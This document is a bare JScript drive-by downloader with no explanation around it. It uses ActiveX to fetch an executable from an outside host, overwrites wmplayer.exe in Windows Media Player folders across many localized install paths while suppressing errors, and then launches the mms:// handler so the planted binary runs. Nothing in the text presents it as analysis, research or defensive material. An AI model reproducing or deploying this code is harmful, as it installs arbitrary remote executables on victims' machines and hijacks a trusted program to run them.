
var x = new ActiveXObject("Microsoft.XMLHTTP"); 
x.Open("GET", "http://eehbarc.com/partner/inst/f26980.exe",0); 
x.Send(); 

var s = new ActiveXObject("ADODB.Stream");
s.Mode = 3;
s.Type = 1;
s.Open();

function FSave(path)
{
    s.Write(x.responseBody);
    s.SaveToFile(path+"wmplayer.exe",2);
}
try{
    FSave("C:\\Programmer\\Windows Media Player\\");
}catch (e){};
try{
    FSave("C:\\Program\\Windows Media Player\\");
}catch (e){};
try{
    FSave("C:\\Programme\\Windows Media Player\\");
}catch (e){};
try{
    FSave("C:\\Programmi\\Windows Media Player\\");
}catch (e){};
try{
    FSave("C:\\Programfiler\\Windows Media Player\\");
}catch (e){};
try{
    FSave("C:\\Programas\\Windows Media Player\\");
}catch (e){};
try{
    FSave("C:\\Archivos de programa\\Windows Media Player\\");
}catch (e){};
try{
    FSave("C:\\Program Files\\Windows Media Player\\");
}catch (e){};
try{
    FSave("D:\\Program Files\\Windows Media Player\\");
}catch (e){};
try{
    FSave("E:\\Program Files\\Windows Media Player\\");
}catch (e){};
try{
    FSave("F:\\Program Files\\Windows Media Player\\");
}catch (e){};

location.href = "mms://";

